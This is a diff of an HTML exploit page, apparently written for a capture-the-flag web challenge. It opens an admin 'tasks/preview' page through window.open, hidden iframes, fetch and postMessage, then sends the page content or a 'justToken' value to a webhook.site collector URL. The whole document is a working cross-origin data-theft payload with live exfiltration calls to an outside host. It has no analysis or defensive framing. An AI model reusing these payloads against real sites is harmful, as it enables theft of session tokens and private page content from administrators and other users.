@@ -1,17 +1,52 @@
-<iframe id="adminFrame" src="http://l25r4lfr9v2hgmwj06jk3nn591q1hd.simpletasks.web.jctf.pro/tasks/preview/0/0" style="display:none;"></iframe>
-
-<script>
-// 监听iframe加载完成
-document.getElementById('adminFrame').onload = function() {
-  // 尝试读取iframe内容（如果同源策略允许）
-  try {
-    const content = this.contentDocument.body.innerHTML;
-    const token = content.match(/justToken\{([^}]+)\}/)?.[1];
-    if (token) {
-      fetch('https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?token=' + token);
-    }
-  } catch(e) {
-    console.log('Same-origin policy blocked');
-  }
-};
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CTF Exploit</title>
+</head>
+<body>
+  <h1>Extracting token...</h1>
+  
+  <!-- 方法1: 使用 window.open -->
+  <script>
+    // 打開 admin 的 preview 頁面
+    var adminWindow = window.open('http://localhost:3000/tasks/preview/0/0', 'admin');
+    
+    // 嘗試讀取內容（可能被阻擋）
+    setTimeout(() => {
+      try {
+        var content = adminWindow.document.body.innerText;
+        window.location = 'https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?token=' + encodeURIComponent(content);
+      } catch(e) {
+        // 如果失敗，使用 postMessage
+        adminWindow.postMessage('getToken', '*');
+      }
+    }, 1000);
+    
+    // 監聽可能的回應
+    window.addEventListener('message', (e) => {
+      window.location = 'https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?data=' + encodeURIComponent(e.data);
+    });
+  </script>
+  
+  <!-- 方法2: 使用隱藏的 iframe -->
+  <iframe src="http://localhost:3000/tasks/preview/0/0" style="display:none" id="target"></iframe>
+  
+  <script>
+    document.getElementById('target').onload = function() {
+      // 嘗試多種方式提取內容
+      setTimeout(() => {
+        // 使用 XHR 請求
+        fetch('http://localhost:3000/tasks/preview/0/0')
+          .then(r => r.text())
+          .then(data => {
+            window.location = 'https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?xhr=' + encodeURIComponent(data);
+          })
+          .catch(e => {
+            // 如果 XHR 失敗，嘗試其他方法
+            window.location = 'https://webhook.site/6c833b47-2a64-4ebe-8368-c5acb67c3f98?error=xhr_failed';
+          });
+      }, 500);
+    };
+  </script>
+</body>
+</html>
